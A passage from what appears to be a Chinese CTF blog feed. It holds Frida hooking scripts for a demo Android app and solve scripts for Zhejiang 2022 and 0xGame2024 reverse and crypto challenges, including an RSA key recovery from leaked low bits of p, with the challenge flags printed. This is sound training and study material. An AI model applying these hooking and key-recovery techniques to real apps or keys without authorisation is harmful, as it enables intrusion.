instance)<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;found instance :&quot;</span>, instance.<span class="hljs-title function_">abc</span>())<br>    &#125;, <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; &#125;<br>&#125;)<br><br><span class="hljs-comment">// hook com.example.demo1.FridaDemo1#nice</span><br>fridaDemo1Class.<span class="hljs-property">nice</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 获取原函数的结果</span><br>  <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">nice</span>();<br>  <span class="hljs-comment">// 打印参数与结果</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nice result&quot;</span>, result)<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">//所有静态方法</span><br><span class="hljs-keyword">var</span> result = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.demo1.MainActivity&quot;</span>).<span class="hljs-title function_">sabc</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br></code></pre></td></tr></table></figure><h3 id="调用主函数中未被调用的方法"><a href="#调用主函数中未被调用的方法" class="headerlink" title="调用主函数中未被调用的方法"></a>调用主函数中未被调用的方法</h3><p>java层未被调用，但native层有未被调用的flag函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> b = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>);<br>    <span class="hljs-keyword">var</span> get_flagaddress = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">var</span> mvaddress = <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span> ; b[i]!= <span class="hljs-literal">null</span> ; i ++ )&#123;<br>        <span class="hljs-comment">// console.log(b[i][&quot;name&quot;])</span><br>        <span class="hljs-keyword">if</span>(b[i][<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;_Z8get_flagii&quot;</span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;function get_flag : &quot;</span>,b[i][<span class="hljs-string">&quot;address&quot;</span>]);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((b[i][<span class="hljs-string">&quot;address&quot;</span>] - a).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>     <span class="hljs-comment">//       mvaddress = b[i][&quot;address&quot;] - a;</span><br>            get_flagaddress = b[i][<span class="hljs-string">&quot;address&quot;</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ptr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br> <br>    <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(get_flagaddress);<br>    <span class="hljs-keyword">const</span> get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr,<span class="hljs-string">&#x27;char&#x27;</span>,[<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>]);<br>    <span class="hljs-keyword">var</span> flag = <span class="hljs-title function_">get_flag</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag)<br>    <span class="hljs-comment">//console.log(b);</span><br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浙江省省赛2022决赛复现</title>
    <link href="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h2><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825184503-feda2d33-3ef7-48cd-a688-48eb0c7f970f.png" class="" title="img"><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825213201-f02099eb-2370-40bb-9d49-53aa64040b2c.png" class="" title="img"><p>逆向密码，因为密文都是偶数所以可以直接逆，如果有奇数的话还得爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>   s+=<span class="hljs-built_in">chr</span>((a[i]&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment">#f4n_4ndro1d</span><br></code></pre></td></tr></table></figure><p>然后模拟器输入账号密码就可以得到flag</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729825549554-47c0e11a-a5f4-4dab-b3c2-1d4c9c5900aa.png" class="" title="img"><h2 id="EzMath2"><a href="#EzMath2" class="headerlink" title="EzMath2"></a>EzMath2</h2><p>upx魔改</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729771704424-ccfd392b-4583-4633-a722-7dd9fb1797ad.png" class="" title="img"><p>脱壳后发现一开始的一个函数修改了密文</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729783737514-4b646adf-f56f-4568-9f55-cb9f8d58e9c6.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x29</span>,<br>  <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x69</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=(a[i]*<span class="hljs-number">43</span>)%<span class="hljs-number">127</span><br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p>遇到花指令</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729772470104-087b52c5-40bd-496f-8396-09c8d9622c6b.png" class="" title="img"><p>nop ret之后删除两个函数再创建函数即可去除花指令</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729783803282-dc4c8178-4dc5-4f14-b651-44de3d9423f4.png" class="" title="img"><p>可以直接爆破或者逆</p><img src="/2024/10/25/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2022%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1729772632451-51455e03-7c0c-4820-8592-c7d1216cf5ea.png" class="" title="img"><p>这题无法动态调试，只能静态分析了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">81</span>, <span class="hljs-number">81</span>, <span class="hljs-number">107</span>, <span class="hljs-number">47</span>, <span class="hljs-number">54</span>, <span class="hljs-number">52</span>, <span class="hljs-number">87</span>, <span class="hljs-number">71</span>, <span class="hljs-number">54</span>, <span class="hljs-number">112</span>, <span class="hljs-number">113</span>, <span class="hljs-number">126</span>, <span class="hljs-number">97</span>, <span class="hljs-number">81</span>, <span class="hljs-number">116</span>, <span class="hljs-number">123</span>, <span class="hljs-number">112</span>, <span class="hljs-number">70</span>]<br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>    a[i]=(a[i]+<span class="hljs-number">1</span>)^<span class="hljs-number">7</span><br>    a[i+<span class="hljs-number">1</span>]=(a[i+<span class="hljs-number">1</span>]*inverse(<span class="hljs-number">57</span>,<span class="hljs-number">127</span>)%<span class="hljs-number">127</span>)&amp;<span class="hljs-number">0x7f</span><br>    s+=<span class="hljs-built_in">chr</span>(a[i])<br>    s += <span class="hljs-built_in">chr</span>(a[i+<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment"># for i in range(len(a)):</span><br><span class="hljs-comment">#     for j in range(32,127):</span><br><span class="hljs-comment">#         k=j</span><br><span class="hljs-comment">#         if i%2:</span><br><span class="hljs-comment">#            k=57*k%127</span><br><span class="hljs-comment">#            if a[i]==k:</span><br><span class="hljs-comment">#                print(chr(j),end=&quot;&quot;)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             k=(k^7)-1</span><br><span class="hljs-comment">#             if a[i] == k:</span><br><span class="hljs-comment">#                 print(chr(j), end=&quot;&quot;)</span><br>DASCTF&#123;U_kn0w_M0du1e_rEv~&#125;<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>不知道factorial的含义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> m<br>flag=<span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span>+m+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br>n = getPrime(<span class="hljs-number">1024</span>)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment">#176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333</span><br>key=math.factorial(n-<span class="hljs-number">1</span>)%n<br>c=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    k=(<span class="hljs-built_in">str</span>.index(i)*key+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span><br>    c+=<span class="hljs-built_in">str</span>[k]<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#u66hp7nuh01puoaip10pi6o0vzavnu11</span><br></code></pre></td></tr></table></figure><p>但是可以本地模拟看函数解释，发现是求阶层，试了几个素数发现key等于n-1</p><p>那么直接正向爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br>n=<span class="hljs-number">176778040837484895481963794918312894811914463587783883976856801676290821243853364789418908640505211936881707629753845875997805883248035576046706978993073043757445726165605877196383212378074705385178610178824713153854530726380795438083708575716562524587045312909657881223522830729052758566504582290081411626333</span><br>key=n-<span class="hljs-number">1</span><br>c=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        k=j<br>        k=(<span class="hljs-built_in">str</span>.index(k)*key+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span><br>        <span class="hljs-keyword">if</span> c[i]==<span class="hljs-built_in">str</span>[k]:<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment">#799a03b7a82076f5028059681df1b72</span><br></code></pre></td></tr></table></figure><h2 id="rssssa5-1"><a href="#rssssa5-1" class="headerlink" title="rssssa5-1"></a>rssssa5-1</h2><p>知道p的低560位，但是最多未知位是454位，也就是至少要爆破10位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p*q<br>m = bytes_to_long(flag)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p&amp;((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">560</span>) - <span class="hljs-number">1</span>))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span><br><span class="hljs-string">c = 1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span><br><span class="hljs-string">p = 1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>这里爆破了15位，当然12位或者其他可能也行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> tqdm<br>n = <span class="hljs-number">21595945409392994055049935446570173194131443801801845658035469673666023560594683551197545038999238700810747167248724184844583697034436158042499504967916978621608536213230969406811902366916932032050583747070735750876593573387957847683066895725722366706359818941065483471589153682177234707645138490589285500875222568286916243861325846262164331536570517513524474322519145470883352586121892275861245291051589531534179640139953079522307426687782419075644619898733819937782418589025945603603989100805716550707637938272890461563518245458692411433603442554397633470070254229240718705126327921819662662201896576503865953330533</span><br>c = <span class="hljs-number">1500765718465847687738186396037558689777598727005427859690647229619648539776087318379834790898189767401195002186003548094137654979353798325221367220839665289140547664641612525534203652911807047718681392766077895625388064095459224402032253429115181543725938853591119977152518616563668740574496233135226296439754690903570240135657268737729815911404733486976376064060345507410815912670147466261149162470191619474107592103882894806322239740349433710606063058160148571050855845964674224651003832579701204330216602742005466066589981707592861990283864753628591214636813639371477417319679603330973431803849304579330791040664</span><br>PR.&lt; x &gt; = Zmod(n)[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">15</span>)):<br>    i = Integer(i)<br>    p = <span class="hljs-number">1426723861968216959675536598409491243380171101180592446441649834738166786277745723654950385796320682900434611832789544257790278878742420696344225394624591657752431494779</span><br>    f = p + i*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>) + x*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>+i.nbits())<br>    res = f.monic().small_roots(X=<span class="hljs-number">2</span>^(<span class="hljs-number">1024</span>-<span class="hljs-number">560</span>-i.nbits()), beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> res:<br>        <span class="hljs-built_in">print</span>(res)<br>        p = p + i*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>) + <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])*<span class="hljs-number">2</span>**(<span class="hljs-number">560</span>+i.nbits())<br>        q = n // p<br>        <span class="hljs-keyword">if</span>  p * q==n:<br>            d = inverse(<span class="hljs-number">65537</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>            <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))))<br><span class="hljs-comment"># b&#x27;DASCTF&#123;ce73935b2e83a78aa5079a9e59ae4980&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>0xGame2024部分Reverse与Crypto</title>
    <link href="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/"/>
    <url>/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="Xor-Random"><a href="#Xor-Random" class="headerlink" title="Xor_Random"></a>Xor_Random</h3><p>动调获取随机数直接异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    srand(<span class="hljs-number">0x77</span>);<br>    rand();<br>    <span class="hljs-type">char</span> v21=<span class="hljs-number">0x7b</span>;<br>    <span class="hljs-type">char</span> v8;<br>    <span class="hljs-type">char</span> a[]=&#123;<span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x24</span>, <br>              <span class="hljs-number">0x10</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <br>              <span class="hljs-number">0x21</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">30</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span> (i&amp;<span class="hljs-number">1</span>)&#123;<br>            v8=v21;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            v8=v21+<span class="hljs-number">3</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]^v8);<br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Zzz"><a href="#Zzz" class="headerlink" title="Zzz"></a>Zzz</h3><p>断点上面扩展了位数，且调试的时候发现输入的v5,v6,v7会被颠倒</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728800526805-5fc3456b-1834-45fe-a55e-0f53bed05ca2-17300799046741.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v10 = BitVec(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">32</span>)<br>v11 = BitVec(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">32</span>)<br>v12 = BitVec(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">32</span>)<br><br>res=[]<br>solver = Solver()<br>solver.add(<span class="hljs-number">11</span> * v11 + <span class="hljs-number">14</span> * v10 - v12 == <span class="hljs-number">0x48FB41DDD</span>)<br>solver.add(<span class="hljs-number">9</span> * v10 - <span class="hljs-number">3</span> * v11 + <span class="hljs-number">4</span> * v12 == <span class="hljs-number">0x2BA692AD7</span>)<br>solver.add((((v12 - v11)) &gt;&gt; <span class="hljs-number">1</span>) + (v10 ^ <span class="hljs-number">0x87654321</span>) == <span class="hljs-number">3451779756</span>)<br><span class="hljs-keyword">if</span> solver.check()==sat:<br>    model=solver.model()<br>    res.append(n2s(model[v10].as_long()))<br>    res.append(n2s(model[v11].as_long()))<br>    res.append(n2s(model[v12].as_long()))<br><span class="hljs-built_in">print</span>(res)<br><br><span class="hljs-comment">#0xGame&#123;e544267d-7812-44b3-a35d-d085a85201a4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="BabyAsm"><a href="#BabyAsm" class="headerlink" title="BabyAsm"></a>BabyAsm</h3><p>直接正向输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 